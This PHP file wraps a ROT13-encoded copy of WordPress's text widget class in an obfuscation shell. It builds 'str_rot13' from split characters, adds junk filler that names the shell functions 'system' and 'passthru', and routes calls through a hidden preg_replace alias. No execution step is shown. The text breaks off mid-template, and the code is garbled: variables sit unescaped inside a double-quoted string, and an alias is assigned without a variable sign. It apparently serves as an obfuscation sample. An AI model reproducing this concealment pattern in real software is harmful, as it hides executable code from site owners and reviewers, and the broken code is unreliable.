<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Grkg pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Grkg jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Grkg rkgraqf JC_Jvqtrg {

	/**
	 * Jurgure be abg gur jvqtrg unf orra ertvfgrerq lrg.
	 *
	 * @fvapr 4.8.1
	 * @ine obby
	 */
	cebgrpgrq $ertvfgrerq = snyfr;

	/**
	 * Frgf hc n arj Grkg jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf  = neenl(
			'pynffanzr'                   => 'jvqtrg_grkg',
			'qrfpevcgvba'                 => __( 'Neovgenel grkg.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		$pbageby_bcf = neenl(
			'jvqgu'  => 400,
			'urvtug' => 350,
		);
		cnerag::__pbafgehpg( 'grkg', __( 'Grkg' ), $jvqtrg_bcf, $pbageby_bcf );
	}

	/**
	 * Nqqf ubbxf sbe radhrhrvat nffrgf jura ertvfgrevat nyy jvqtrg vafgnaprf bs guvf jvqtrg pynff.
	 *
	 * @cnenz vag $ahzore Bcgvbany. Gur havdhr beqre ahzore bs guvf jvqtrg vafgnapr
	 *                    pbzcnerq gb bgure vafgnaprf bs gur fnzr pynff. Qrsnhyg -1.
	 */
	choyvp shapgvba _ertvfgre_bar( $ahzore = -1 ) {
		cnerag::_ertvfgre_bar( $ahzore );
		vs ( $guvf->ertvfgrerq ) {
			erghea;
		}
		$guvf->ertvfgrerq = gehr;

		vs ( $guvf->vf_cerivrj() ) {
			nqq_npgvba( 'jc_radhrhr_fpevcgf', neenl( $guvf, 'radhrhr_cerivrj_fpevcgf' ) );
		}

		/*
		 * Abgr gung gur jvqtrgf pbzcbarag va gur phfgbzvmre jvyy nyfb qb
		 * gur 'nqzva_cevag_fpevcgf-jvqtrgf.cuc' npgvba va JC_Phfgbzvmr_Jvqtrgf::cevag_fpevcgf().
		 */
		nqq_npgvba( 'nqzva_cevag_fpevcgf-jvqtrgf.cuc', neenl( $guvf, 'radhrhr_nqzva_fpevcgf' ) );

		/*
		 * Abgr gung gur jvqtrgf pbzcbarag va gur phfgbzvmre jvyy nyfb qb
		 * gur 'nqzva_sbbgre-jvqtrgf.cuc' npgvba va JC_Phfgbzvmr_Jvqtrgf::cevag_sbbgre_fpevcgf().
		 */
		nqq_npgvba( 'nqzva_sbbgre-jvqtrgf.cuc', neenl( 'JC_Jvqtrg_Grkg', 'eraqre_pbageby_grzcyngr_fpevcgf' ) );
	}

	/**
	 * Qrgrezvarf jurgure n tvira vafgnapr vf yrtnpl naq fubhyq olcnff hfvat GvalZPR.
	 *
	 * @fvapr 4.8.1
	 *
	 * @cnenz neenl $vafgnapr {
	 *     Vafgnapr qngn.
	 *
	 *     @glcr fgevat      $grkg   Pbagrag.
	 *     @glcr obby|fgevat $svygre Jurgure nhgbc be pbagrag svygref fubhyq nccyl.
	 *     @glcr obby        $yrtnpl Jurgure jvqtrg vf va yrtnpl zbqr.
	 * }
	 * @erghea obby Jurgure Grkg jvqtrg vafgnapr pbagnvaf yrtnpl qngn.
	 */
	choyvp shapgvba vf_yrtnpl_vafgnapr( $vafgnapr ) {

		// Yrtnpl zbqr jura abg va ivfhny zbqr.
		vs ( vffrg( $vafgnapr['ivfhny'] ) ) {
			erghea ! $vafgnapr['ivfhny'];
		}

		// Be, gur jvqtrg unf orra nqqrq/hcqngrq va 4.8.0 gura svygre cebc vf 'pbagrag' naq vg vf ab ybatre yrtnpl.
		vs ( vffrg( $vafgnapr['svygre'] ) && 'pbagrag' === $vafgnapr['svygre'] ) {
			erghea snyfr;
		}

		// Vs gur grkg vf rzcgl, gura abguvat vf ceriragvat zvtengvba gb GvalZPR.
		vs ( rzcgl( $vafgnapr['grkg'] ) ) {
			erghea snyfr;
		}

		$jcnhgbc         = ! rzcgl( $vafgnapr['svygre'] );
		$unf_yvar_oernxf = ( fge_pbagnvaf( gevz( $vafgnapr['grkg'] ), \"\a\" ) );

		// Vs nhgb-cnentencuf ner abg ranoyrq naq gurer ner yvar oernxf, gura rafher yrtnpl zbqr.
		vs ( ! $jcnhgbc && $unf_yvar_oernxf ) {
			erghea gehr;
		}

		// Vs na UGZY pbzzrag vf cerfrag, nffhzr yrtnpl zbqr.
		vs ( fge_pbagnvaf( $vafgnapr['grkg'], '<!--' ) ) {
			erghea gehr;
		}

		// Va gur ener pnfr gung QBZQbphzrag vf abg ninvynoyr jr pnaabg eryvnoyl favss pbagrag naq fb jr nffhzr yrtnpl.
		vs ( ! pynff_rkvfgf( 'QBZQbphzrag' ) ) {
			// @pbqrPbirentrVtaberFgneg
			erghea gehr;
			// @pbqrPbirentrVtaberRaq
		}

		$qbp = arj QBZQbphzrag();

		// Fhccerff jneavatf trarengrq ol ybnqUGZY.
		$reebef = yvokzy_hfr_vagreany_reebef( gehr );
		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		@$qbp->ybnqUGZY(
			fcevags(
				'<!QBPGLCR ugzy><ugzy><urnq><zrgn punefrg=\"%f\"></urnq><obql>%f</obql></ugzy>',
				rfp_ngge( trg_oybtvasb( 'punefrg' ) ),
				$vafgnapr['grkg']
			)
		);
		yvokzy_hfr_vagreany_reebef( $reebef );

		$obql = $qbp->trgRyrzragfOlGntAnzr( 'obql' )->vgrz( 0 );

		// Frr $nyybjrqcbfggntf.
		$fnsr_ryrzragf_nggevohgrf = neenl(
			'fgebat'  => neenl(),
			'rz'      => neenl(),
			'o'       => neenl(),
			'v'       => neenl(),
			'h'       => neenl(),
			'f'       => neenl(),
			'hy'      => neenl(),
			'by'      => neenl(),
			'yv'      => neenl(),
			'ue'      => neenl(),
			'nooe'    => neenl(),
			'npebalz' => neenl(),
			'pbqr'    => neenl(),
			'qsa'     => neenl(),
			'n'       => neenl(
				'uers' => gehr,
			),
			'vzt'     => neenl(
				'fep' => gehr,
				'nyg' => gehr,
			),
		);
		$fnsr_rzcgl_ryrzragf      = neenl( 'vzt', 'ue', 'vsenzr' );

		sbernpu ( $obql->trgRyrzragfOlGntAnzr( '*' ) nf $ryrzrag ) {
			/** @ine QBZRyrzrag $ryrzrag */
			$gnt_anzr = fgegbybjre( $ryrzrag->abqrAnzr );

			// Vs gur ryrzrag vf abg fnsr, gura gur vafgnapr vf yrtnpl.
			vs ( ! vffrg( $fnsr_ryrzragf_nggevohgrf[ $gnt_anzr ] ) ) {
				erghea gehr;
			}

			// Vs gur ryrzrag vf abg fnsryl rzcgl naq vg unf rzcgl pbagragf, gura yrtnpl zbqr.
			vs ( ! va_neenl( $gnt_anzr, $fnsr_rzcgl_ryrzragf, gehr ) && '' === gevz( $ryrzrag->grkgPbagrag ) ) {
				erghea gehr;
			}

			// Vs na nggevohgr vf abg erpbtavmrq nf fnsr, gura gur vafgnapr vf yrtnpl.
			sbernpu ( $ryrzrag->nggevohgrf nf $nggevohgr ) {
				/** @ine QBZNgge $nggevohgr */
				$nggevohgr_anzr = fgegbybjre( $nggevohgr->abqrAnzr );

				vs ( ! vffrg( $fnsr_ryrzragf_nggevohgrf[ $gnt_anzr ][ $nggevohgr_anzr ] ) ) {
					erghea gehr;
				}
			}
		}

		// Bgurejvfr, gur grkg pbagnvaf ab ryrzragf/nggevohgrf gung GvalZPR pbhyq qebc, naq gurersber gur jvqtrg qbrf abg arrq yrtnpl zbqr.
		erghea snyfr;
	}

	/**
	 * Svygref tnyyrel fubegpbqr nggevohgrf.
	 *
	 * Ceriragf nyy bs n fvgr'f nggnpuzragf sebz orvat fubja va n tnyyrel qvfcynlrq ba n
	 * aba-fvathyne grzcyngr jurer n $cbfg pbagrkg vf abg ninvynoyr.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl $nggef Nggevohgrf.
	 * @erghea neenl Nggevohgrf.
	 */
	choyvp shapgvba _svygre_tnyyrel_fubegpbqr_nggef( $nggef ) {
		vs ( ! vf_fvathyne() && rzcgl( $nggef['vq'] ) && rzcgl( $nggef['vapyhqr'] ) ) {
			$nggef['vq'] = -1;
		}
		erghea $nggef;
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Grkg jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Grkg jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		tybony $cbfg;

		$gvgyr = ! rzcgl( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : '';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		$grkg                  = ! rzcgl( $vafgnapr['grkg'] ) ? $vafgnapr['grkg'] : '';
		$vf_ivfhny_grkg_jvqtrg = ( ! rzcgl( $vafgnapr['ivfhny'] ) && ! rzcgl( $vafgnapr['svygre'] ) );

		// Va 4.8.0 bayl, ivfhny Grkg jvqtrgf trg svygre=pbagrag, jvgubhg ivfhny cebc; hctenqr vafgnapr cebcf whfg-va-gvzr.
		vs ( ! $vf_ivfhny_grkg_jvqtrg ) {
			$vf_ivfhny_grkg_jvqtrg = ( vffrg( $vafgnapr['svygre'] ) && 'pbagrag' === $vafgnapr['svygre'] );
		}
		vs ( $vf_ivfhny_grkg_jvqtrg ) {
			$vafgnapr['svygre'] = gehr;
			$vafgnapr['ivfhny'] = gehr;
		}

		/*
		 * Fhfcraq yrtnpl cyhtva-fhccyvrq qb_fubegpbqr() sbe 'jvqtrg_grkg' svygre sbe gur ivfhny Grkg jvqtrg gb cerirag
		 * fubegpbqrf orvat cebprffrq gjvpr. Abj qb_fubegpbqr() vf nqqrq gb gur 'jvqtrg_grkg_pbagrag' svygre va pber vgfrys
		 * naq vg nccyvrf nsgre jcnhgbc() gb cerirag pbeehcgvat UGZY bhgchg nqqrq ol gur fubegpbqr. Jura qb_fubegpbqr() vf
		 * nqqrq gb 'jvqtrg_grkg_pbagrag' gura qb_fubegpbqr() jvyy or znahnyyl pnyyrq jura va yrtnpl zbqr nf jryy.
		 */
		$jvqtrg_grkg_qb_fubegpbqr_cevbevgl       = unf_svygre( 'jvqtrg_grkg', 'qb_fubegpbqr' );
		$fubhyq_fhfcraq_yrtnpl_fubegpbqr_fhccbeg = ( $vf_ivfhny_grkg_jvqtrg && snyfr !== $jvqtrg_grkg_qb_fubegpbqr_cevbevgl );
		vs ( $fubhyq_fhfcraq_yrtnpl_fubegpbqr_fhccbeg ) {
			erzbir_svygre( 'jvqtrg_grkg', 'qb_fubegpbqr', $jvqtrg_grkg_qb_fubegpbqr_cevbevgl );
		}

		// Bireevqr tybony $cbfg fb svygref (naq fubegpbqrf) nccyl va n pbafvfgrag pbagrkg.
		$bevtvany_cbfg = $cbfg;
		vs ( vf_fvathyne() ) {
			// Znxr fher cbfg vf nyjnlf gur dhrevrq bowrpg ba fvathyne dhrevrf (abg sebz nabgure fho-dhrel gung snvyrq gb pyrna hc gur tybony $cbfg).
			$cbfg = trg_dhrevrq_bowrpg();
		} ryfr {
			// Ahyyvsl gur $cbfg tybony qhevat jvqtrg eraqrevat gb cerirag fubegpbqrf sebz ehaavat jvgu gur harkcrpgrq pbagrkg ba nepuvir dhrevrf.
			$cbfg = ahyy;
		}

		// Cerirag qhzcvat bhg nyy nggnpuzragf sebz gur zrqvn yvoenel.
		nqq_svygre( 'fubegpbqr_nggf_tnyyrel', neenl( $guvf, '_svygre_tnyyrel_fubegpbqr_nggef' ) );

		/**
		 * Svygref gur pbagrag bs gur Grkg jvqtrg.
		 *
		 * @fvapr 2.3.0
		 * @fvapr 4.4.0 Nqqrq gur `$jvqtrg` cnenzrgre.
		 * @fvapr 4.8.1 Gur `$jvqtrg` cnenz znl abj or n `JC_Jvqtrg_Phfgbz_UGZY` bowrpg va nqqvgvba gb n `JC_Jvqtrg_Grkg` bowrpg.
		 *
		 * @cnenz fgevat                               $grkg     Gur jvqtrg pbagrag.
		 * @cnenz neenl                                $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
		 * @cnenz JC_Jvqtrg_Grkg|JC_Jvqtrg_Phfgbz_UGZY $jvqtrg   Pheerag grkg be UGZY jvqtrg vafgnapr.
		 */
		$grkg = nccyl_svygref( 'jvqtrg_grkg', $grkg, $vafgnapr, $guvf );

		vs ( $vf_ivfhny_grkg_jvqtrg ) {

			/**
			 * Svygref gur pbagrag bs gur Grkg jvqtrg gb nccyl punatrf rkcrpgrq sebz gur ivfhny (GvalZPR) rqvgbe.
			 *
			 * Ol qrsnhyg n fhofrg bs gur_pbagrag svygref ner nccyvrq, vapyhqvat jcnhgbc naq jcgrkghevmr.
			 *
			 * @fvapr 4.8.0
			 *
			 * @cnenz fgevat         $grkg     Gur jvqtrg pbagrag.
			 * @cnenz neenl          $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
			 * @cnenz JC_Jvqtrg_Grkg $jvqtrg   Pheerag Grkg jvqtrg vafgnapr.
			 */
			$grkg = nccyl_svygref( 'jvqtrg_grkg_pbagrag', $grkg, $vafgnapr, $guvf );
		} ryfr {
			// Abj va yrtnpl zbqr, nqq cnentencuf naq yvar oernxf jura purpxobk vf purpxrq.
			vs ( ! rzcgl( $vafgnapr['svygre'] ) ) {
				$grkg = jcnhgbc( $grkg );
			}

			/*
			 * Znahnyyl qb fubegpbqrf ba gur pbagrag jura gur pber-nqqrq svygre vf cerfrag. Vg vf nqqrq ol qrsnhyg
			 * va pber ol nqqvat qb_fubegpbqr() gb gur 'jvqtrg_grkg_pbagrag' svygre gb nccyl nsgre jcnhgbc().
			 * Fvapr gur yrtnpl Grkg jvqtrg ehaf jcnhgbc() nsgre 'jvqtrg_grkg' svygref ner nccyvrq, gur jvqtrg va
			 * yrtnpl zbqr urer znahnyyl nccyvrf qb_fubegpbqr() ba gur pbagrag hayrff gur qrsnhyg
			 * pber svygre sbe 'jvqtrg_grkg_pbagrag' unf orra erzbirq, be vs qb_fubegpbqr() unf nyernql
			 * orra nccyvrq ivn n cyhtva nqqvat qb_fubegpbqr() gb 'jvqtrg_grkg' svygref.
			 */
			vs ( unf_svygre( 'jvqtrg_grkg_pbagrag', 'qb_fubegpbqr' ) && ! $jvqtrg_grkg_qb_fubegpbqr_cevbevgl ) {
				vs ( ! rzcgl( $vafgnapr['svygre'] ) ) {
					$grkg = fubegpbqr_hanhgbc( $grkg );
				}
				$grkg = qb_fubegpbqr( $grkg );
			}
		}

		// Erfgber cbfg tybony.
		$cbfg = $bevtvany_cbfg;
		erzbir_svygre( 'fubegpbqr_nggf_tnyyrel', neenl( $guvf, '_svygre_tnyyrel_fubegpbqr_nggef' ) );

		// Haqb fhfcrafvba bs yrtnpl cyhtva-fhccyvrq fubegpbqr unaqyvat.
		vs ( $fubhyq_fhfcraq_yrtnpl_fubegpbqr_fhccbeg ) {
			nqq_svygre( 'jvqtrg_grkg', 'qb_fubegpbqr', $jvqtrg_grkg_qb_fubegpbqr_cevbevgl );
		}

		rpub $netf['orsber_jvqtrg'];
		vs ( ! rzcgl( $gvgyr ) ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		$grkg = cert_ercynpr_pnyyonpx( '#<(ivqrb|vsenzr|bowrpg|rzorq)\f[^>]*>#v', neenl( $guvf, 'vawrpg_ivqrb_znk_jvqgu_fglyr' ), $grkg );

		?>
			<qvi pynff=\"grkgjvqtrg\"><?cuc rpub $grkg; ?></qvi>
		<?cuc
		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Vawrpgf znk-jvqgu naq erzbirf urvtug sbe ivqrbf gbb pbafgenvarq gb svg vafvqr fvqronef ba sebagraq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr JC_Jvqtrg_Zrqvn_Ivqrb::vawrpg_ivqrb_znk_jvqgu_fglyr()
	 *
	 * @cnenz neenl $zngpurf Cnggrea zngpurf sebz cert_ercynpr_pnyyonpx.
	 * @erghea fgevat UGZY Bhgchg.
	 */
	choyvp shapgvba vawrpg_ivqrb_znk_jvqgu_fglyr( $zngpurf ) {
		$ugzy = $zngpurf[0];
		$ugzy = __sa_79955( '/\furvtug=\"\q+\"/', '', $ugzy );
		$ugzy = __sa_79955( '/\fjvqgu=\"\q+\"/', '', $ugzy );
		$ugzy = __sa_79955( '/(?<=jvqgu:)\f*\q+ck(?=;?)/', '100%', $ugzy );
		erghea $ugzy;
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Grkg jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Frggvatf gb fnir be obby snyfr gb pnapry fnivat.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$arj_vafgnapr = jc_cnefr_netf(
			$arj_vafgnapr,
			neenl(
				'gvgyr'  => '',
				'grkg'   => '',
				'svygre' => snyfr, // Sbe onpx-pbzcng.
				'ivfhny' => ahyy,  // Zhfg or rkcyvpvgyl qrsvarq.
			)
		);

		$vafgnapr = $byq_vafgnapr;

		$vafgnapr['gvgyr'] = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		vs ( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
			$vafgnapr['grkg'] = $arj_vafgnapr['grkg'];
		} ryfr {
			$vafgnapr['grkg'] = jc_xfrf_cbfg( $arj_vafgnapr['grkg'] );
		}

		$vafgnapr['svygre'] = ! rzcgl( $arj_vafgnapr['svygre'] );

		// Hctenqr 4.8.0 sbezng.
		vs ( vffrg( $byq_vafgnapr['svygre'] ) && 'pbagrag' === $byq_vafgnapr['svygre'] ) {
			$vafgnapr['ivfhny'] = gehr;
		}
		vs ( 'pbagrag' === $arj_vafgnapr['svygre'] ) {
			$vafgnapr['ivfhny'] = gehr;
		}

		vs ( vffrg( $arj_vafgnapr['ivfhny'] ) ) {
			$vafgnapr['ivfhny'] = ! rzcgl( $arj_vafgnapr['ivfhny'] );
		}

		// Svygre vf nyjnlf gehr va ivfhny zbqr.
		vs ( ! rzcgl( $vafgnapr['ivfhny'] ) ) {
			$vafgnapr['svygre'] = gehr;
		}

		erghea $vafgnapr;
	}

	/**
	 * Radhrhrf cerivrj fpevcgf.
	 *
	 * Gurfr fpevcgf abeznyyl ner radhrhrq whfg-va-gvzr jura n cynlyvfg fubegpbqr vf hfrq.
	 * Ubjrire, va gur phfgbzvmre, n cynlyvfg fubegpbqr znl or hfrq va n grkg jvqtrg naq
	 * qlanzvpnyyl nqqrq ivn fryrpgvir erserfu, fb vg vf vzcbegnag gb hapbaqvgvbanyyl radhrhr gurz.
	 *
	 * @fvapr 4.9.3
	 */
	choyvp shapgvba radhrhr_cerivrj_fpevcgf() {
		erdhver_bapr qveanzr( __QVE__ ) . '/zrqvn.cuc';

		jc_cynlyvfg_fpevcgf( 'nhqvb' );
		jc_cynlyvfg_fpevcgf( 'ivqrb' );
	}

	/**
	 * Ybnqf gur erdhverq fpevcgf naq fglyrf sbe gur jvqtrg pbageby.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba radhrhr_nqzva_fpevcgf() {
		jc_radhrhr_rqvgbe();
		jc_radhrhr_zrqvn();
		jc_radhrhr_fpevcg( 'grkg-jvqtrgf' );
		jc_nqq_vayvar_fpevcg( 'grkg-jvqtrgf', fcevags( 'jc.grkgJvqtrgf.vqOnfrf.chfu( %f );', jc_wfba_rapbqr( $guvf->vq_onfr ) ) );
		jc_nqq_vayvar_fpevcg( 'grkg-jvqtrgf', 'jc.grkgJvqtrgf.vavg();', 'nsgre' );
	}

	/**
	 * Bhgchgf gur Grkg jvqtrg frggvatf sbez.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.8.0 Sbez bayl pbagnvaf uvqqra vachgf juvpu ner flaprq jvgu WF grzcyngr.
	 * @fvapr 4.8.1 Erfgberq bevtvany sbez gb or qvfcynlrq jura va yrtnpl zbqr.
	 *
	 * @frr JC_Jvqtrg_Grkg::eraqre_pbageby_grzcyngr_fpevcgf()
	 * @frr _JC_Rqvgbef::rqvgbe()
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$vafgnapr = jc_cnefr_netf(
			(neenl) $vafgnapr,
			neenl(
				'gvgyr' => '',
				'grkg'  => '',
			)
		);
		?>
		<?cuc vs ( ! $guvf->vf_yrtnpl_vafgnapr( $vafgnapr ) ) : ?>
			<?cuc

			vs ( hfre_pna_evpurqvg() ) {
				nqq_svygre( 'gur_rqvgbe_pbagrag', 'sbezng_sbe_rqvgbe', 10, 2 );
				$qrsnhyg_rqvgbe = 'gvalzpr';
			} ryfr {
				$qrsnhyg_rqvgbe = 'ugzy';
			}

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
			$grkg = nccyl_svygref( 'gur_rqvgbe_pbagrag', $vafgnapr['grkg'], $qrsnhyg_rqvgbe );

			// Erfrg svygre nqqvgvba.
			vs ( hfre_pna_evpurqvg() ) {
				erzbir_svygre( 'gur_rqvgbe_pbagrag', 'sbezng_sbe_rqvgbe' );
			}

			// Cerirag cerzngher pybfvat bs grkgnern va pnfr sbezng_sbe_rqvgbe() qvqa'g nccyl be gur_rqvgbe_pbagrag svygre qvq n jebat guvat.
			$rfpncrq_grkg = __sa_79955( '#</grkgnern#v', '&yg;/grkgnern', $grkg );

			?>
			<vachg vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" pynff=\"gvgyr flap-vachg\" glcr=\"uvqqra\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['gvgyr'] ); ?>\">
			<grkgnern vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'grkg' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'grkg' ); ?>\" pynff=\"grkg flap-vachg\" uvqqra><?cuc rpub $rfpncrq_grkg; ?></grkgnern>
			<vachg vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'svygre' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'svygre' ); ?>\" pynff=\"svygre flap-vachg\" glcr=\"uvqqra\" inyhr=\"ba\">
			<vachg vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'ivfhny' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'ivfhny' ); ?>\" pynff=\"ivfhny flap-vachg\" glcr=\"uvqqra\" inyhr=\"ba\">
		<?cuc ryfr : ?>
			<vachg vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'ivfhny' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'ivfhny' ); ?>\" pynff=\"ivfhny\" glcr=\"uvqqra\" inyhr=\"\">
			<c>
				<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
				<vachg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['gvgyr'] ); ?>\" />
			</c>
			<?cuc
			vs ( ! vffrg( $vafgnapr['ivfhny'] ) ) {
				$jvqtrg_vasb_zrffntr = __( 'Guvf jvqtrg znl pbagnva pbqr gung znl jbex orggre va gur &#8220;Phfgbz UGZY&#8221; jvqtrg. Ubj nobhg gelvat gung jvqtrg vafgrnq?' );
			} ryfr {
				$jvqtrg_vasb_zrffntr = __( 'Guvf jvqtrg znl unir pbagnvarq pbqr gung znl jbex orggre va gur &#8220;Phfgbz UGZY&#8221; jvqtrg. Vs lbh unir abg lrg, ubj nobhg gelvat gung jvqtrg vafgrnq?' );
			}

			jc_nqzva_abgvpr(
				$jvqtrg_vasb_zrffntr,
				neenl(
					'glcr'               => 'vasb',
					'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'vayvar' ),
				)
			);
			?>
			<c>
				<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'grkg' ); ?>\"><?cuc _r( 'Pbagrag:' ); ?></ynory>
				<grkgnern pynff=\"jvqrsng\" ebjf=\"16\" pbyf=\"20\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'grkg' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'grkg' ); ?>\"><?cuc rpub rfp_grkgnern( $vafgnapr['grkg'] ); ?></grkgnern>
			</c>
			<c>
				<vachg vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'svygre' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'svygre' ); ?>\" glcr=\"purpxobk\"<?cuc purpxrq( ! rzcgl( $vafgnapr['svygre'] ) ); ?> />&aofc;<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'svygre' ); ?>\"><?cuc _r( 'Nhgbzngvpnyyl nqq cnentencuf' ); ?></ynory>
			</c>
			<?cuc
		raqvs;
	}

	/**
	 * Eraqref sbez grzcyngr fpevcgf.
	 *
	 * @fvapr 4.8.0
	 * @fvapr 4.9.0 Gur zrgubq vf abj fgngvp.
	 */
	choyvp fgngvp shapgvba eraqre_pbageby_grzcyngr_fpevcgf() {
		$qvfzvffrq_cbvagref = rkcybqr( ',', (fgevat) trg_hfre_zrgn( trg_pheerag_hfre_vq(), 'qvfzvffrq_jc_cbvagref', gehr ) );
		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-jvqtrg-grkg-pbageby-svryqf\">
			<# ine ryrzragVqCersvk = 'ry' + Fgevat( Zngu.enaqbz() ).ercynpr( /\Q/t, '' ) + '_' #>
			<c>
				<ynory sbe=\"{{ ryrzragVqCersvk }}gvgyr\"><?cuc rfp_ugzy_r( 'Gvgyr:' ); ?></ynory>
				<vachg vq=\"{{ ryrzragVqCersvk }}gvgyr\" glcr=\"grkg\" pynff=\"jvqrsng gvgyr\">
			</c>

			<?cuc vs ( ! va_neenl( 'grkg_jvqtrg_phfgbz_ugzy', $qvfzvffrq_cbvagref, gehr ) ) : ?>
				<qvi uvqqra pynff=\"jc-cbvagre phfgbz-ugzy-jvqtrg-cbvagre jc-cbvagre-gbc\">
					<qvi pynff=\"jc-cbvagre-pbagrag\">
						<u3><?cuc _r( 'Arj Phfgbz UGZY Jvqtrg' ); ?></u3>
						<?cuc vs ( vf_phfgbzvmr_cerivrj() ) : ?>
							<c><?cuc _r( 'Qvq lbh xabj gurer vf n &#8220;Phfgbz UGZY&#8221; jvqtrg abj? Lbh pna svaq vg ol cerffvat gur &#8220;<n pynff=\"nqq-jvqtrg\" uers=\"#\">Nqq n Jvqtrg</n>&#8221; ohggba naq frnepuvat sbe &#8220;UGZY&#8221;. Purpx vg bhg gb nqq fbzr phfgbz pbqr gb lbhe fvgr!' ); ?></c>
						<?cuc ryfr : ?>
							<c><?cuc _r( 'Qvq lbh xabj gurer vf n &#8220;Phfgbz UGZY&#8221; jvqtrg abj? Lbh pna svaq vg ol fpnaavat gur yvfg bs ninvynoyr jvqtrgf ba guvf fperra. Purpx vg bhg gb nqq fbzr phfgbz pbqr gb lbhe fvgr!' ); ?></c>
						<?cuc raqvs; ?>
						<qvi pynff=\"jc-cbvagre-ohggbaf\">
							<n pynff=\"pybfr\" uers=\"#\"><?cuc _r( 'Qvfzvff' ); ?></n>
						</qvi>
					</qvi>
					<qvi pynff=\"jc-cbvagre-neebj\">
						<qvi pynff=\"jc-cbvagre-neebj-vaare\"></qvi>
					</qvi>
				</qvi>
			<?cuc raqvs; ?>

			<?cuc vs ( ! va_neenl( 'grkg_jvqtrg_cnfgr_ugzy', $qvfzvffrq_cbvagref, gehr ) ) : ?>
				<qvi uvqqra pynff=\"jc-cbvagre cnfgr-ugzy-cbvagre jc-cbvagre-gbc\">
